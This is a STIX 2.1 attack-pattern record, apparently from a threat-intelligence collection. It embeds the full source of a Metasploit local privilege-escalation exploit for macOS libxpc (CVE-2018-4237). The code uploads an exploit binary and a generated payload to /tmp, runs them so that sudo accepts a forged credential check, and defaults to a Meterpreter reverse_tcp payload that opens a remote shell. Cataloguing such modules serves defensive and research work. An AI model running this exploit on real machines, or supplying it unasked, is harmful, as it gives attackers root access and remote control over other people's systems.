{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bc862c3b-5ea7-437c-8069-17a4d8e89039",
    "created": "2024-08-14T16:34:40.252631Z",
    "modified": "2024-08-14T16:34:40.252635Z",
    "name": "Mac OS X libxpc MITM Privilege Escalation",
    "description": " This module exploits a vulnerablity in libxpc on macOS <= 10.13.3 The task_set_special_port API allows callers to overwrite their bootstrap port which is used to communicate with launchd. This port is inherited across forks: child processes will use the same bootstrap port as the parent. By overwriting the bootstrap port and forking a child processes, we can now gain a MitM position between our child and launchd.  To gain root we target the sudo binary and intercept its communication with opendirectoryd, which is used by sudo to verify credentials. We modify the replies from opendirectoryd to make it look like our password was valid.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/libxpc_mitm_ssudo.rb",
            "external_id": "libxpc_mitm_ssudo.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-4237"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/saelo/pwn2own2018"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Mac OS X libxpc MITM Privilege Escalation',\n      'Description'   => %q{\n        This module exploits a vulnerablity in libxpc on macOS <= 10.13.3\n        The task_set_special_port API allows callers to overwrite their bootstrap port,\n        which is used to communicate with launchd. This port is inherited across forks:\n        child processes will use the same bootstrap port as the parent.\n        By overwriting the bootstrap port and forking a child processes, we can now gain\n        a MitM position between our child and launchd.\n\n        To gain root we target the sudo binary and intercept its communication with\n        opendirectoryd, which is used by sudo to verify credentials. We modify the\n        replies from opendirectoryd to make it look like our password was valid.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'         => [ 'saelo' ],\n      'References'     => [\n          ['CVE', '2018-4237'],\n          ['URL', 'https://github.com/saelo/pwn2own2018'],\n        ],\n      'Arch'           => [ ARCH_X64 ],\n      'Platform'       => 'osx',\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' },\n      'Targets'        => [\n          [ 'Mac OS X x64 (Native Payload)', { } ]\n        ],\n      'DisclosureDate' => '2018-03-15'))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def upload_executable_file(filepath, filedata)\n    print_status(\"Uploading file: '#{filepath}'\")\n    write_file(filepath, filedata)\n    chmod(filepath)\n    register_file_for_cleanup(filepath)\n  end\n\n  def check\n    version = Rex::Version.new(get_system_version)\n    if version >= Rex::Version.new('10.13.4')\n      CheckCode::Safe\n    else\n      CheckCode::Appears\n    end\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    exploit_data = File.binread(File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2018-4237\", \"ssudo\" ))\n    exploit_file = \"#{datastore['WritableDir']}/#{Rex::Text::rand_text_alpha_lower(6..12)}\"\n    upload_executable_file(exploit_file, exploit_data)\n    payload_file = \"#{datastore['WritableDir']}/#{Rex::Text::rand_text_alpha_lower(6..12)}\"\n    upload_executable_file(payload_file, generate_payload_exe)\n    exploit_cmd = \"#{exploit_file} #{payload_file}\"\n    print_status(\"Executing cmd '#{exploit_cmd}'\")\n    cmd_exec(exploit_cmd)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-03-15",
    "x_mitre_platforms": [
        "osx'"
    ]
}